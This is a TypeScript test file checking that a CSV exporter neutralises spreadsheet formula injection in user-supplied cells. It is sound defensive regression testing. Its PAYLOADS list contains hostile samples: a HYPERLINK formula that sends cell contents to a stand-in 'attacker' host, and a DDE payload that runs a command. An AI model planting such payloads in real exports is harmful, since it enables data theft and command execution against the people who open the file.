/**
 * CSV formula injection — the export is auditor-facing, and its cells are
 * user-supplied.
 *
 * ## Why the pre-existing tests could not have caught this
 *
 * The vulnerable exporters were, and remain, RFC-4180 correct:
 *
 *     `"${(cell || '').replace(/"/g, '""')}"`
 *
 * Every parser-based assertion therefore PASSES on a payload. Round-trip the
 * file through `parseCsv` and you get the original string back, cell counts
 * intact, quoting intact — a perfectly well-formed document containing a live
 * formula. The defect is not in the CSV layer at all; it is what Excel,
 * LibreOffice and Sheets do with a cell that BEGINS with `=`, `+`, `-` or `@`
 * on open.
 *
 * So these assert the NEUTRALISATION, not the parse. The parse tests below
 * exist only to prove the fix did not break well-formedness — they are the
 * weaker half deliberately, and on their own they would be worthless.
 */
import { parseCsv } from '@/lib/csv/parse-csv';
import { csvCell, neutralizeCsvCell, toCsv } from '@/lib/csv/format-csv';

/**
 * Real payload shapes, not `=1+1`.
 *
 * HYPERLINK is the one that matters most here: it renders as ordinary blue
 * link text, exfiltrates a neighbouring cell to a remote host, and does it
 * under the AUDITOR's identity and network position rather than the
 * attacker's. DDE (`=cmd|...`) is the classic command-execution shape.
 */
const PAYLOADS: ReadonlyArray<{ name: string; value: string }> = [
    { name: 'HYPERLINK exfiltration', value: '=HYPERLINK("http://attacker/"&A1,"click")' },
    { name: 'DDE command execution', value: "=cmd|'/c calc'!A1" },
    { name: 'plus-prefixed', value: '+1+1' },
    { name: 'minus-prefixed', value: '-1+1' },
    { name: 'at-prefixed (Lotus/legacy)', value: '@SUM(1+1)' },
    { name: 'tab-then-formula', value: '\t=1+1' },
    { name: 'CR-then-formula', value: '\r=1+1' },
];

describe('neutralizeCsvCell', () => {
    it.each(PAYLOADS)('prefixes $name so a spreadsheet reads it as text', ({ value }) => {
        const out = neutralizeCsvCell(value);
        expect(out).toBe(`'${value}`);
        // The property that actually matters: the first character is no
        // longer one a spreadsheet dispatches on.
        expect(['=', '+', '-', '@', '\t', '\r']).not.toContain(out[0]);
    });

    it.each([
        ['ordinary control name', 'Access Control Policy'],
        ['internal punctuation', 'Reviewed = annually'],
        ['leading digit', '2026 review'],
        ['leading space', ' =not-at-the-front'],
        ['empty', ''],
    ])('leaves %s untouched', (_label, value) => {
        expect(neutralizeCsvCell(value)).toBe(value);
    });

    it('does not neutralise a formula character that is not leading', () => {
        // Over-escaping would corrupt legitimate content — an auditor reading
        // "Budget +10%" should see exactly that.
        expect(neutralizeCsvCell('Budget +10%')).toBe('Budget +10%');
    });
});

describe('csvCell — neutralise BEFORE quote-escaping', () => {
    it('puts the apostrophe INSIDE the quotes', () => {
        // Order is load-bearing. Escaping first would emit `'"=SUM(A1)"`,
        // which is malformed: the apostrophe sits outside the quoted field.
        // Parsers that repair that by discarding the stray character hand the
        // formula straight back.
        expect(csvCell('=SUM(A1)')).toBe(`"'=SUM(A1)"`);
        expect(csvCell('=SUM(A1)')).not.toBe(`'"=SUM(A1)"`);
    });

    it('still escapes embedded quotes', () => {
        expect(csvCell('she said "hi"')).toBe('"she said ""hi"""');
    });

    it('escapes quotes in a payload that ALSO needs neutralising', () => {
        expect(csvCell('=HYPERLINK("http://x","c")')).toBe(
            `"'=HYPERLINK(""http://x"",""c"")"`,
        );
    });

    it.each([null, undefined])('renders %s as an empty quoted cell', (v) => {
        expect(csvCell(v)).toBe('""');
    });
});

describe('a control named as a formula round-trips neutralised', () => {
    /**
     * The end-to-end shape of the readiness/coverage exports: a row whose
     * control-name cell is attacker-chosen.
     */
    it.each(PAYLOADS)('$name is inert in the exported document', ({ value }) => {
        const csv = toCsv([
            ['Status', 'Control Code', 'Control Name'],
            ['Mapped', 'AC-1', value],
        ]);

        // (a) The value survives — we neutralised, not stripped. An auditor
        //     must still be able to see what the control is called.
        const parsed = parseCsv(csv);
        expect(parsed[1][2]).toBe(`'${value}`);
        expect(parsed[1][2]).toContain(value);

        // (b) And it is inert: no cell in the document starts with a trigger.
        for (const row of parsed) {
            for (const cell of row) {
                expect(['=', '+', '-', '@', '\t', '\r']).not.toContain(cell[0]);
            }
        }
    });

    it('leaves an ordinary export byte-identical to the old output', () => {
        // Regression guard on the fix itself: neutralisation must be a no-op
        // for the 99% case, or every existing exported file changes shape.
        const rows = [
            ['Status', 'Requirement Code', 'Control Name'],
            ['Mapped', 'A.5.1', 'Information security policies'],
            ['Unmapped', 'A.5.2', ''],
        ];
        const legacy = rows
            .map((r) => r.map((c) => `"${(c || '').replace(/"/g, '""')}"`).join(','))
            .join('\n');
        expect(toCsv(rows)).toBe(legacy);
    });

    it('the well-formedness the old tests checked is preserved', () => {
        // Deliberately the weak assertion, kept only to prove the fix did not
        // break parsing. It passes on the VULNERABLE implementation too —
        // which is the whole reason this file leads with the assertions above.
        const csv = toCsv([
            ['a', 'b'],
            ['=1+1', 'multi\nline'],
        ]);
        const parsed = parseCsv(csv);
        expect(parsed).toHaveLength(2);
        expect(parsed[1]).toHaveLength(2);
        expect(parsed[1][1]).toBe('multi\nline');
    });
});
